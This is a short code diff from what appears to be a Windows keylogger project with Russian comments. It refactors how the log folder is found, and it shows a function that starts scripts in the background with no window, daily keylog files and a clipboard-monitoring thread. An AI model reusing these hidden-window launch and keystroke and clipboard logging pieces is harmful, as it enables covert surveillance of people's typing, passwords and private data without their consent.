@@ -9,18 +9,17 @@ import psutil
 import win32gui
 import win32process
 from datetime import datetime
-from .keylogger import load_config
+from .keylogger import load_config, get_log_dir
 
 config = load_config()
 ALLOWED_PROCESSES = config.get("allowed_processes", [])
-# Определяет директорию для логов (работает и в exe и в python)
-def get_log_dir():
-    if getattr(sys, 'frozen', False):
-        return os.path.dirname(sys.executable)
-    return os.path.dirname(os.path.abspath(__file__))
 
-log_dir = os.path.join(get_log_dir(), "logs")
-os.makedirs(log_dir, exist_ok=True)
+# Упрощаем получение пути к папке logs
+log_dir = get_log_dir()
+
+# Создаем папку только если она не существует
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir, exist_ok=True)
 
 # Запускает скрипт в фоновом режиме без окна
 def start_background(script_name):
@@ -32,6 +31,7 @@ def start_background(script_name):
         startupinfo=si,
         creationflags=subprocess.CREATE_NO_WINDOW
     )
+
 def get_log_file_path():
     today = datetime.now().strftime("%Y-%m-%d")
     return os.path.join(log_dir, f"{today}_keylog.txt")
@@ -78,7 +78,6 @@ def clipboard_monitor():
                     logging.exception("Clipboard logger failed to write")
                 last_data = data
 
-#смотрим буфер обмена
 def start_clipboard_logger():
     t = threading.Thread(target=clipboard_monitor, daemon=True)
     t.start()
